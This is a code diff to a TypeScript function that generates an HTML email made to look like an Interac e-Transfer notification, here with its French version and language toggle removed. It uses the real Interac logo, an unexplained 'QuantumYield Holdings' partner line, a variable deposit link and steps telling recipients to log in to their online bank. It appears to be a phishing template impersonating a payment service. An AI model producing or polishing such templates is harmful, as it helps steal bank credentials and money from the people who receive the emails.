@@ -74,77 +74,38 @@ export function generateInteracEmailHtml(data: EmailData): string {
     .topbar-left {
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 16px;
     }
     .topbar img {
       height: 50px;
       display: block;
     }
     .dba {
-      background-color: #000000;
-      color: rgba(250, 250, 250, 0.4);
-      font-weight: bold;
-      font-size: 12px;
-      padding: 6px 10px;
-      border-radius: 4px;
-      border: 1px solid rgba(250, 250, 250, 0.1);
+      display: flex;
+      align-items: center;
+      color: rgba(255, 255, 255, 0.7);
+      font-weight: 500;
+      font-size: 13px;
+      line-height: 50px;
+      letter-spacing: 0.3px;
     }
     .topbar-right {
       display: flex;
       align-items: center;
       gap: 12px;
     }
-    /* Interactive language toggle styling */
-    .lang-toggle {
-      display: flex;
-      gap: 4px;
-      align-items: center;
-      background-color: rgba(255, 255, 255, 0.1);
-      border-radius: 4px;
-      padding: 2px;
-    }
-    .lang-toggle span {
-      color: #ffffff;
-      font-size: 12px;
-      opacity: 0.6;
-      cursor: pointer;
-      user-select: none;
-      padding: 4px 10px;
-      border-radius: 3px;
-      transition: background-color 0.2s, opacity 0.2s;
-      font-weight: 500;
-    }
-    .lang-toggle span:hover {
-      opacity: 0.9;
-      background-color: rgba(255, 255, 255, 0.15);
-    }
-    .lang-toggle span.active {
-      font-weight: 600;
-      opacity: 1;
-      background-color: rgba(255, 255, 255, 0.2);
-      color: #ffffff;
-    }
     .brand {
-      color: #ffffff;
-      font-weight: 600;
-      font-size: 14px;
-      padding: 6px 12px;
-      border-radius: 4px;
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      background-color: transparent;
-      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      color: rgba(255, 255, 255, 0.7);
+      font-weight: 500;
+      font-size: 13px;
+      letter-spacing: 0.3px;
     }
     .content-wrapper {
       padding: 32px 24px;
     }
-    /* Language section toggling */
-    .lang-section {
-      display: none;
-    }
-    .lang-section.active {
-      display: block;
-    }
-    /* </CHANGE> */
+    
     .greeting-section h1 {
       font-size: 24px;
       margin-bottom: 16px;
@@ -336,20 +297,14 @@ export function generateInteracEmailHtml(data: EmailData): string {
     <div class="topbar">
       <div class="topbar-left">
         <img src="https://etransfer-notification.interac.ca/images/new/interac_logo.png" alt="INTERAC e-Transfer" height="50">
-        <div class="dba" data-lang-key="dba">Partnered with QuantumYield Holdings</div>
+        <div class="dba">Partnered with QuantumYield Holdings</div>
       </div>
       <div class="topbar-right">
-        <div class="lang-toggle">
-          <span class="active" data-lang="en">EN</span>
-          <span data-lang="fr">FR</span>
-        </div>
         <div class="brand">e-Transfer</div>
       </div>
     </div>
 
     <div class="content-wrapper">
-      <!-- English Content Section -->
-      <div class="lang-section active" data-lang="en">
         <div class="greeting-section">
           <h1>Hi ${recipientName},</h1>
           <p>You've received a secure Interac e-Transfer.</p>
@@ -422,85 +377,6 @@ export function generateInteracEmailHtml(data: EmailData): string {
             This is a secure transaction. For your security, please do not forward this email as it contains confidential information meant only for you.
           </p>
         </div>
-      </div>
-      <!-- </CHANGE> -->
-
-      <!-- French Content Section -->
-      <div class="lang-section" data-lang="fr">
-        <div class="greeting-section">
-          <h1>Bonjour ${recipientName},</h1>
-          <p>Vous avez reçu un virement Interac sécurisé.</p>
-
-          <div class="amount-box">
-            Montant : ${formattedAmount} $ CAD
-          </div>
-
-          <div class="details-card">
-            <h3>Détails du virement</h3>
-            <div class="detail-row">
-              <span class="detail-label">Date :</span>
-              <span class="detail-value">${currentDateFr}</span>
-            </div>
-            <div class="detail-row">
-              <span class="detail-label">De :</span>
-              <span class="detail-value">${institution}</span>
-            </div>
-            <div class="detail-row">
-              <span class="detail-label">ID du virement :</span>
-              <span class="detail-value">${transferId}</span>
-            </div>
-            <div class="detail-row">
-              <span class="detail-label">Montant :</span>
-              <span class="detail-value">${formattedAmount} $ CAD</span>
-            </div>
-          </div>
-
-          ${
-            message
-              ? `<div class="message-box">
-            <strong>Message (facultatif) :</strong>
-            ${message}
-          </div>`
-              : ""
-          }
-
-          <div class="security-section">
-            <h4>
-              <span>🔒</span>
-              <span>Question de sécurité</span>
-            </h4>
-            <div class="security-toggle">
-              <p class="security-question-text">${securityQuestion}</p>
-              <div class="security-answer">
-                <strong>Réponse :</strong> ${maskedAnswer}
-              </div>
-              <p class="reveal-text">
-                <strong>Important :</strong> L'expéditeur doit vous fournir la réponse de sécurité pour compléter ce dépôt. Contactez l'expéditeur directement si vous n'avez pas reçu la réponse. Cette étape est requise pour la vérification de sécurité et la validation de la transaction.
-              </p>
-            </div>
-          </div>
-
-          <div class="button-section">
-            <a href="${depositLink}" class="deposit-button">Déposer votre argent</a>
-          </div>
-
-          <div class="instructions">
-            <h4>Comment déposer :</h4>
-            <ol>
-              <li>Cliquez sur le bouton « Déposer votre argent » ci-dessus.</li>
-              <li>Sélectionnez votre institution financière.</li>
-              <li>Connectez-vous à votre banque en ligne.</li>
-              <li>Répondez à la question de sécurité.</li>
-              <li>Choisissez le compte dans lequel déposer l'argent.</li>
-            </ol>
-          </div>
-
-          <p class="security-notice">
-            Ceci est une transaction sécurisée. Pour votre sécurité, veuillez ne pas transférer cet courriel car il contient des informations confidentielles destinées uniquement à vous.
-          </p>
-        </div>
-      </div>
-      <!-- </CHANGE> -->
     </div>
 
     <div class="footer">
@@ -512,39 +388,7 @@ export function generateInteracEmailHtml(data: EmailData): string {
     </div>
   </div>
 
-  <!-- JavaScript for language toggle -->
-  <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      var langToggles = document.querySelectorAll('.lang-toggle span[data-lang]');
-      var langSections = document.querySelectorAll('.lang-section[data-lang]');
-
-      langToggles.forEach(function(toggle) {
-        toggle.addEventListener('click', function() {
-          var selectedLang = this.getAttribute('data-lang');
-
-          langToggles.forEach(function(t) { t.classList.remove('active'); });
-          this.classList.add('active');
-
-          document.documentElement.setAttribute('lang', selectedLang);
-
-          langSections.forEach(function(section) {
-            if (section.getAttribute('data-lang') === selectedLang) {
-              section.classList.add('active');
-            } else {
-              section.classList.remove('active');
-            }
-          });
-
-          var dba = document.querySelector('.dba');
-          if (selectedLang === 'fr') {
-            dba.textContent = 'Partenaire de QuantumYield Holdings';
-          } else {
-            dba.textContent = 'Partnered with QuantumYield Holdings';
-          }
-        });
-      });
-    });
-  </script>
+  
 </body>
 </html>
 `
